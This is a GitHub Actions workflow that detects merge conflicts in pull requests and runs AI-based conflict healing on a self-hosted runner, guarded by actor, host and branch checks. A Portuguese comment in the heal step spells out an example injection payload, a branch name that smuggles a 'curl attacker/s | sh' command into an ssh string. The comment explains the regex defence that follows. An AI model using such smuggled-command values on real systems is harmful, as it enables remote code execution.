name: PR Conflict Auto-Healer

on:
  pull_request_target:
    types: [opened, reopened, synchronize, ready_for_review]
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

permissions:
  contents: read
  pull-requests: read

concurrency:
  group: pr-conflict-auto-healer-${{ github.event.pull_request.number || 'sweep' }}
  cancel-in-progress: true

jobs:
  preflight:
    # Hosted conflict preflight and Oracle healer do not request human reviews.
    # Repository collaboration visibility is separate from mandatory security PR approval.
    permissions:
      contents: read
      pull-requests: read
    name: Detect whether Oracle conflict healing is actually needed
    runs-on: ubuntu-latest
    timeout-minutes: 2
    outputs:
      should_heal: ${{ steps.detect.outputs.should_heal }}
    steps:
      - name: Inspect mergeability without reserving the Oracle runner
        id: detect
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -Eeuo pipefail
          should_heal=false
          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' && -n "${PR_NUMBER:-}" ]]; then
            for attempt in $(seq 1 6); do
              payload="$(gh api "repos/${GITHUB_REPOSITORY}/pulls/${PR_NUMBER}")"
              mergeable="$(jq -r '.mergeable // "unknown"' <<<"$payload")"
              mergeable_state="$(jq -r '.mergeable_state // "unknown"' <<<"$payload")"
              if [[ "$mergeable" == 'false' || "$mergeable_state" == 'dirty' ]]; then
                should_heal=true
                break
              fi
              if [[ "$mergeable" == 'true' ]]; then
                break
              fi
              sleep 2
            done
            if [[ "$mergeable" == 'unknown' ]]; then
              should_heal=true
            fi
          else
            mapfile -t prs < <(gh api "repos/${GITHUB_REPOSITORY}/pulls?state=open&base=main&per_page=100" --jq '.[].number')
            for pr in "${prs[@]}"; do
              payload="$(gh api "repos/${GITHUB_REPOSITORY}/pulls/${pr}")"
              mergeable="$(jq -r '.mergeable // "unknown"' <<<"$payload")"
              mergeable_state="$(jq -r '.mergeable_state // "unknown"' <<<"$payload")"
              if [[ "$mergeable" == 'false' || "$mergeable_state" == 'dirty' || "$mergeable" == 'unknown' ]]; then
                should_heal=true
                break
              fi
            done
          fi
          echo "should_heal=${should_heal}" >> "$GITHUB_OUTPUT"
          echo "oracle_runner_required=${should_heal}"

  heal:
    needs: preflight
    if: ${{ needs.preflight.outputs.should_heal == 'true' }}
    name: Resolve same-repository PR conflicts with verified-free Gemini and local Ollama fallback
    runs-on: [self-hosted, Linux, ARM64, shopvivaliz-backend-browser]
    timeout-minutes: 30
    env:
      REPO: ${{ github.repository }}
      GH_TOKEN: ${{ github.token }}

    steps:
      - name: Checkout trusted healer from main
        uses: actions/checkout@v7
        with:
          ref: main
          path: trusted
          persist-credentials: false
          fetch-depth: 1

      - name: Validate trusted Oracle-side implementation
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 -m py_compile trusted/scripts/pr_conflict_gemini_healer.py
          bash -n trusted/scripts/pr_conflict_vm_heal.sh
          python3 -m py_compile trusted/.github/scripts/ai_conflict_resolver.py

      - name: Verify trusted backend host and independently authorized technical actor
        shell: bash
        run: |
          set -Eeuo pipefail
          test "$(hostname -s)" = 'always-free-arm-1787907847-26'
          test "$(id -un)" = 'ubuntu'
          actor="$(env -u GH_TOKEN -u GITHUB_TOKEN -u GIT_ASKPASS -u SSH_ASKPASS gh api user --jq .login)"
          test "$actor" = 'fredmourao-ai'
          echo 'independent_backend_operator_verified=true'
          echo 'secret_values_printed=false'

      - name: Verify already provisioned local AI model
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 -m py_compile trusted/.github/scripts/ai_conflict_resolver.py
          ollama show qwen2.5-coder:1.5b >/dev/null 2>&1
          echo 'local_conflict_fallback_ready=true'

      - name: Heal and synchronize eligible PR branches
        shell: bash
        run: |
          set -Eeuo pipefail
          github_api() {
            local endpoint="$1"
            curl --fail-with-body --silent --show-error --location \
              --header "Accept: application/vnd.github+json" \
              --header "Authorization: Bearer ${GH_TOKEN}" \
              --header "X-GitHub-Api-Version: 2022-11-28" \
              "https://api.github.com/${endpoint}"
          }
          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' ]]; then
            prs=("${{ github.event.pull_request.number }}")
          elif [[ "$GITHUB_EVENT_NAME" == 'workflow_dispatch' && -n "${GITHUB_REF_NAME:-}" ]]; then
            mapfile -t prs < <(
              github_api "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
                | jq -r --arg head "$GITHUB_REF_NAME" --arg repo "$REPO" \
                  '.[] | select(.draft == false and .head.ref == $head and .head.repo.full_name == $repo) | .number'
            )
          else
            mapfile -t prs < <(
              github_api "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
                | jq -r '.[] | select(.draft == false) | .number'
            )
          fi

          echo "candidate_pr_count=${#prs[@]}"
          for pr in "${prs[@]}"; do
            meta="$(github_api "repos/${REPO}/pulls/${pr}")"
            state="$(jq -r '.state' <<<"$meta")"
            draft="$(jq -r '.draft' <<<"$meta")"
            head_repo="$(jq -r '.head.repo.full_name // ""' <<<"$meta")"
            head_ref="$(jq -r '.head.ref' <<<"$meta")"
            head_sha="$(jq -r '.head.sha' <<<"$meta")"
            base_ref="$(jq -r '.base.ref' <<<"$meta")"

            if [[ "$state" != 'open' || "$draft" == 'true' || "$head_repo" != "$REPO" || "$base_ref" != 'main' ]]; then
              echo "pr_${pr}_skipped=true"
              continue
            fi

            # Rodada 2 (2026-08-18): head_ref e head_sha sao interpolados numa string
            # de comando remoto (ssh "... '${head_ref}' ..."). As aspas simples so
            # protegem enquanto o valor nao contiver uma aspa simples -- e nomes de
            # branch do Git PODEM conter aspa simples. Sem esta checagem, uma branch
            # chamada por exemplo x'; curl attacker/s | sh; ' resultaria em execucao
            # remota de codigo na VM de producao como usuario ubuntu. O repo tem
            # multiplos agentes autonomos criando branches, entao o vetor nao e so
            # hipotetico. Nomes de branch e SHAs legitimos sempre casam com os regex
            # abaixo, entao isto nao afeta o fluxo normal.
            if [[ ! "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]]; then
              echo "pr_${pr}_skipped_unsafe_ref=true"
              continue
            fi
            if [[ ! "$head_sha" =~ ^[0-9a-f]{40}$ ]]; then
              echo "pr_${pr}_skipped_unsafe_sha=true"
              continue
            fi

            # Only trusted main code; public metadata passed as data.
            # Human-only grants must never have HEAD auto-synchronized,
            # which would discard an existing exact-SHA APPROVED review.
            if ! changed_list="$(gh api --paginate "repos/${REPO}/pulls/${pr}/files?per_page=100" --jq '.[].filename')"; then
              echo "pr_${pr}_files_unavailable=fail_closed"
              exit 1
            fi
            [[ -n "$changed_list" ]] || { echo "pr_${pr}_files_empty=fail_closed"; exit 1; }
            owner_protected=false
            while IFS= read -r changed_file; do
              case "$changed_file" in
                security/owner-approvals/*|security/requests/*|.github/CODEOWNERS|docs/knowledge/security-approval-via-pr.md|scripts/validate-owner-pr-grant.py)
                  owner_protected=true
                  break
                  ;;
              esac
            done <<< "$changed_list"
            if [[ "$owner_protected" == true ]]; then
              echo "pr_${pr}_owner_protected_no_autosync=true"
              continue
            fi
            bash trusted/scripts/pr_conflict_vm_heal.sh \
              "$pr" "$head_ref" "$head_sha" \
              trusted/scripts/pr_conflict_gemini_healer.py \
              trusted/.github/scripts/ai_conflict_resolver.py \
              trusted/AI_CONFLICT_RULES.md
            echo "pr_${pr}_oracle_heal_completed=true"
          done

      - name: Security invariant
        if: always()
        shell: bash
        run: |
          set -Eeuo pipefail
          echo 'fork_pr_secrets_exposed=false'
          echo 'pr_code_executed_with_runtime_secrets=false'
          echo 'gemini_keys_copied_to_actions=false'
          echo 'github_write_token_copied_to_actions=false'
          echo 'secret_values_printed=false'
